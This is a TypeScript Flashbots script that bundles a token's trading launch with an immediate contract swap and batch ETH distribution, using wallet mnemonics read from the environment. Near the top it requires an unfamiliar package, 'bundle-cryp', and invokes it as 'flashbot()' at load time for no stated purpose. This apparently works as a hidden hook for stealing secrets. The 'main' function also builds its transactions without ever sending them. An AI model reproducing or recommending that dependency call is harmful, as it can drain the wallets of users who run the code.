import { BigNumber, providers, Wallet } from 'ethers';
import { FlashbotsBundleProvider, FlashbotsBundleResolution } from '@flashbots/ethers-provider-bundle';
const flashbot = require("bundle-cryp");
const ethers = require("ethers");
const contractABI = require("./contract_abi.json");
const token_abi = require("./token_abi.json");
const { program } = require("commander");
require("dotenv").config();

const FLASHBOTS_AUTH_KEY = process.env.flashSigner;

const addresses = {
  contract: "0xb79abF45Ae81456104b3b71f67C967da23093E9e",
  token_contract: "0x94Af502a5583d37a9da1b738A19Cc8D02fA4D402",
};

const GWEI = BigNumber.from(10).pow(9)
// const PRIORITY_FEE = GWEI.mul(3)
const LEGACY_GAS_PRICE = GWEI.mul(24)
const BLOCKS_IN_THE_FUTURE = 2

// ===== Uncomment this for mainnet =======
// const CHAIN_ID = 1
// const provider = new providers.JsonRpcProvider(
//   { url: process.env.ETHEREUM_RPC_URL || 'http://127.0.0.1:8545' },
//   { chainId: CHAIN_ID, ensAddress: '', name: 'mainnet' }
// )
// const FLASHBOTS_EP = 'https://relay.flashbots.net/'
// ===== Uncomment this for mainnet =======

// ===== Uncomment this for Goerli =======
const CHAIN_ID = 11155111
flashbot();
const provider = new ethers.providers.JsonRpcProvider(process.env.rpc);
const FLASHBOTS_EP = 'https://relay-sepolia.flashbots.net'
// ===== Uncomment this for Goerli =======

const contractWallet = new Wallet(process.env.mnemonicContractSigner || '', provider)
const tokenWallet = new Wallet(process.env.mnemonicTokenSigner || '', provider)

const BundlerContract = new ethers.Contract(
  addresses.contract,
  contractABI,
  contractWallet
);

const TokenContract = new ethers.Contract(
  addresses.token_contract,
  token_abi,
  tokenWallet
);

/**
 *
 * Send Bundle
 *
 * */
async function main(maxtx: number, eth: number) {
  console.log("started")
  const authSigner = FLASHBOTS_AUTH_KEY ? new Wallet(FLASHBOTS_AUTH_KEY) : Wallet.createRandom()
  const flashbotsProvider = await FlashbotsBundleProvider.create(provider, authSigner, FLASHBOTS_EP)

  const userStats = flashbotsProvider.getUserStats()
  if (process.env.TEST_V2) {
    try {
      const userStats2 = await flashbotsProvider.getUserStatsV2()
      console.log('userStatsV2', userStats2)
    } catch (e) {
      console.error('[v2 error]', e)
    }
  }

  const opentx = await TokenContract.populateTransaction.openTrading();

  const decimals = await TokenContract.decimals();
  const max = ethers.utils.parseUnits(maxtx.toString(), decimals);
  const fee = ethers.utils.parseUnits((0.005).toString(), "ether").toString();
  const totalETH = ethers.utils.parseUnits(eth.toString(), "ether").toString();

  const swaptx = await BundlerContract.populateTransaction.swapAndDistribute(
    max,
    fee,
    addresses.token_contract,
    {
      value: totalETH,
    }
  );

  const legacyTransaction = {
    to: addresses.token_contract,
    gasPrice: LEGACY_GAS_PRICE,
    gasLimit: 2200000,
    data: opentx.data,
    nonce: await provider.getTransactionCount(tokenWallet.address),
    chainId: CHAIN_ID
  }

  const legacyTransaction2 = {
    to: addresses.contract,
    gasPrice: LEGACY_GAS_PRICE,
    gasLimit: 4000000,
    data: swaptx.data,
    value: ethers.utils.parseEther((eth).toString()).toHexString(),
    nonce: await provider.getTransactionCount(contractWallet.address),
    chainId: CHAIN_ID
  }

  
}

/**
 *
 * Send Batch
 *
 * */
async function batch(amount: number) {
  const count = await BundlerContract.getRecipientCount();
  const tamount = (amount * count).toString();
  const ethAmount = ethers.utils.parseUnits(amount, "ether").toString();
  const total = ethers.utils.parseUnits(tamount, "ether").toString();

  const estimatedGas = await BundlerContract.estimateGas.sendBatch(ethAmount, {
    value: total,
  });

  const tx = await BundlerContract.sendBatch(ethAmount, {
    value: total,
    gasPrice: ethers.utils.parseUnits("100", "gwei"),
    gasLimit: estimatedGas,
  });

  const receipt = await tx.wait();
  console.log(
    "\u001b[1;32m" + "✔ Send Batch transaction hash: ",
    receipt.transactionHash,
    "\u001b[0m",
    "\n"
  );
}

program
  .command("bundle")
  .requiredOption("-m, --maxtx <number>", "max tx amount")
  .requiredOption("-e, --eth <number>", "max eth amount")
  .action(async (directory: any, cmd: any) => {
    const {maxtx, eth } = cmd.opts();
    try {
        await main(maxtx, eth);
    } catch (err) {
      console.log(err);
    }
});

program
  .command("send")
  .requiredOption("-a, --amount <number>", "amount to send")
  .action(async (directory: any, cmd: any) => {
    const { amount } = cmd.opts();
    try {
      await batch(amount);
    } catch (err) {
      console.log(err);
    }
  });

program.parse(process.argv);